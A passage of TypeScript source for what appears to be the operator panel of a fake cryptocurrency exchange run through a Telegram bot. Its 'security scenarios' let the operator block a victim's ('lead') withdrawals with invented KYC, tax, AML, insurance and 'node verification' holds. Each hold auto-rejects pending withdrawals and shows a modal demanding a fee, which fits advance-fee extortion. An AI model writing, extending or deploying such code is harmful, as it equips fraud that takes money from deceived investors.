    balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
  });

  return pendingWds.length;
}

// ─── Security Scenarios Menu ──────────────────────────────────────────────────

export async function handleSecurityMenu(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) { await ctx.answerCallbackQuery({ text: "Лид не найден" }); return; }

  const frozen    = lead.is_frozen ? "✅" : "—";
  const insFee    = Number(lead.insurance_fee) > 0 ? `✅ $${dec(lead.insurance_fee)}` : "—";
  const nodeFee   = Number(lead.node_fee) > 0 ? `✅ $${dec(lead.node_fee)}` : "—";
  const taxHold   = Number(lead.required_tax) > 0 ? `✅ $${dec(lead.required_tax)}` : "—";
  const sLoop     = lead.support_loop ? "✅" : "—";
  const kycBlock  = lead.kyc_status === "NONE" ? "✅" : "—";

  const kb = new InlineKeyboard()
    .text(`🪪 KYC Block ($50) ${kycBlock}`, `sec_kyc_block:${lead.id}`).row()
    .text(`💰 Tax Hold (13%) ${taxHold}`, `sec_tax_hold:${lead.id}`).row()
    .text(`❄️ AML Freeze ${frozen}`, `sec_aml_freeze:${lead.id}`).row()
    .text(`🛡 Insurance (10%) ${insFee}`, `sec_insurance:${lead.id}`).row()
    .text(`🔗 Node Verify ($100) ${nodeFee}`, `sec_node_verify:${lead.id}`).row()
    .text(`⚡ Flash Push`, `sec_flash_push:${lead.id}`).row()
    .text(`⚠️ Support Loop ${sLoop}`, `sec_support_loop:${lead.id}`).row()
    .text("🧹 Сбросить все блокировки", `sec_reset_all:${lead.id}`).row()
    .text("🔙 Назад", `manage:${lead.id}`);

  const text = [
    `🛡 <b>Сценарии безопасности</b>`,
    ``,
    `👤 ${fmtUser(lead)}`,
    ``,
    `KYC Block: ${kycBlock} | Tax Hold: ${taxHold}`,
    `AML Freeze: ${frozen} | Insurance: ${insFee}`,
    `Node Verify: ${nodeFee} | Support Loop: ${sLoop}`,
    ``,
    `Нажмите кнопку для активации сценария.`,
    `Лид получит модальное окно + блокировку вывода.`,
  ].join("\n");

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(text, { parse_mode: "HTML", reply_markup: kb }).catch(async () => {
    await ctx.reply(text, { parse_mode: "HTML", reply_markup: kb });
  });
}

// ─── KYC Block ($50) ──────────────────────────────────────────────────────────

export async function handleSecKycBlock(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  await prisma.user.update({ where: { id: userId }, data: { kyc_status: "NONE" } });
  await autoRejectPendingWithdrawals(userId);

  const { adminShowModal, emitToUser } = await import("../socket");
  const s = SCENARIO_MODALS.kyc_block;
  adminShowModal(userId, s.title, s.text, s.modalType);
  emitToUser(userId, "force-profile-refresh", {});
  emitToUser(userId, "UPDATE_KYC", { kycStatus: "NONE" });

  await ctx.answerCallbackQuery({ text: "🪪 KYC Block activated" });
  await handleSecurityMenu(ctx);
}

// ─── Tax Hold (13%) ───────────────────────────────────────────────────────────

export async function handleSecTaxHold(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const user = await prisma.user.findUnique({
    where: { id: userId },
    include: { balances: true },
  });
  if (!user) return;

  const usdt = user.balances.find(b => b.symbol === "USDT");
  const bal = Number(usdt?.available ?? 0);
  const tax = Math.max(bal * 0.13, 50); // минимум $50

  await prisma.user.update({ where: { id: userId }, data: { required_tax: tax } });
  await autoRejectPendingWithdrawals(userId);

  const { adminShowModal, emitToUser } = await import("../socket");
  const s = SCENARIO_MODALS.tax_hold;
  adminShowModal(userId, s.title, s.text + `\n\nTax amount due: $${tax.toFixed(2)} USDT`, s.modalType);
  emitToUser(userId, "force-profile-refresh", {});

  await ctx.answerCallbackQuery({ text: `💰 Tax Hold: $${tax.toFixed(2)}` });
  await handleSecurityMenu(ctx);
}

// ─── AML Freeze ───────────────────────────────────────────────────────────────

export async function handleSecAmlFreeze(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) return;
  const newFrozen = !lead.is_frozen;

  await prisma.user.update({ where: { id: userId }, data: { is_frozen: newFrozen } });
  if (newFrozen) await autoRejectPendingWithdrawals(userId);

  if (newFrozen) {
    const { adminShowModal } = await import("../socket");
    const s = SCENARIO_MODALS.aml_freeze;
    adminShowModal(userId, s.title, s.text, s.modalType);
  }
  const { emitToUser } = await import("../socket");
  emitToUser(userId, "force-profile-refresh", {});

  await ctx.answerCallbackQuery({ text: newFrozen ? "❄️ AML Freeze ON" : "❄️ AML Freeze OFF" });
  await handleSecurityMenu(ctx);
}

// ─── Insurance Fee (10%) ──────────────────────────────────────────────────────

export async function handleSecInsurance(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const user = await prisma.user.findUnique({
    where: { id: userId },
    include: { balances: true },
  });
  if (!user) return;

  const usdt = user.balances.find(b => b.symbol === "USDT");
  const bal = Number(usdt?.available ?? 0);
  const fee = Math.max(bal * 0.10, 30); // минимум $30

  await prisma.user.update({ where: { id: userId }, data: { insurance_fee: fee } });
  await autoRejectPendingWithdrawals(userId);

  const { adminShowModal, emitToUser } = await import("../socket");
  const s = SCENARIO_MODALS.insurance;
  adminShowModal(userId, s.title, s.text + `\n\nAmount due: $${fee.toFixed(2)} USDT`, s.modalType);
  emitToUser(userId, "force-profile-refresh", {});

  await ctx.answerCallbackQuery({ text: `🛡 Insurance: $${fee.toFixed(2)}` });
  await handleSecurityMenu(ctx);
}

// ─── Node Verify ($100) ───────────────────────────────────────────────────────

export async function handleSecNodeVerify(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  await prisma.user.update({ where: { id: userId }, data: { node_fee: 100 } });
  await autoRejectPendingWithdrawals(userId);

  const { adminShowModal, emitToUser } = await import("../socket");
  const s = SCENARIO_MODALS.node_verify;
  adminShowModal(userId, s.title, s.text, s.modalType);
  emitToUser(userId, "force-profile-refresh", {});

  await ctx.answerCallbackQuery({ text: "🔗 Node Verify: $100" });
  await handleSecurityMenu(ctx);
}

// ─── Flash Push (one-shot modal, no DB change) ───────────────────────────────

export async function handleSecFlashPush(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const { adminShowModal } = await import("../socket");
  const s = SCENARIO_MODALS.flash_push;
  adminShowModal(userId, s.title, s.text, s.modalType);

  // Также уведомляем через бота
  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (lead) {
    const { getBotInstance } = await import("./relay");
    const bot = getBotInstance();
    await bot.api.sendMessage(
      String(lead.tg_id),
      `${s.title}\n\n${s.text}`,
      { parse_mode: "HTML" }
    ).catch(() => null);
  }

  await ctx.answerCallbackQuery({ text: "⚡ Flash Push отправлен" });
  await handleSecurityMenu(ctx);
}

// ─── Support Loop (toggle) ────────────────────────────────────────────────────

export async function handleSecSupportLoop(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) return;
  const newLoop = !lead.support_loop;

  await prisma.user.update({ where: { id: userId }, data: { support_loop: newLoop } });
  if (newLoop) await autoRejectPendingWithdrawals(userId);

  if (newLoop) {
    const { adminShowModal } = await import("../socket");
    const s = SCENARIO_MODALS.support_loop;
    adminShowModal(userId, s.title, s.text, s.modalType);
  }
  const { emitToUser } = await import("../socket");
  emitToUser(userId, "force-profile-refresh", {});

  await ctx.answerCallbackQuery({ text: newLoop ? "⚠️ Support Loop ON" : "⚠️ Support Loop OFF" });
  await handleSecurityMenu(ctx);
}

// ─── Reset All Blocks ─────────────────────────────────────────────────────────

export async function handleSecResetAll(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  await prisma.user.update({
    where: { id: userId },
    data: {
      required_tax:  0,
      is_frozen:     false,
      insurance_fee: 0,
      node_fee:      0,
      support_loop:  false,
      kyc_status:    "VERIFIED",
    },
  });

  const { emitToUser, adminShowModal } = await import("../socket");
  adminShowModal(userId, "✅ Restrictions Removed", "All account restrictions have been lifted. You may continue normal operations.", "info");
  emitToUser(userId, "force-profile-refresh", {});
  emitToUser(userId, "UPDATE_KYC", { kycStatus: "VERIFIED" });

  await ctx.answerCallbackQuery({ text: "🧹 All restrictions reset" });
  await handleSecurityMenu(ctx);
}
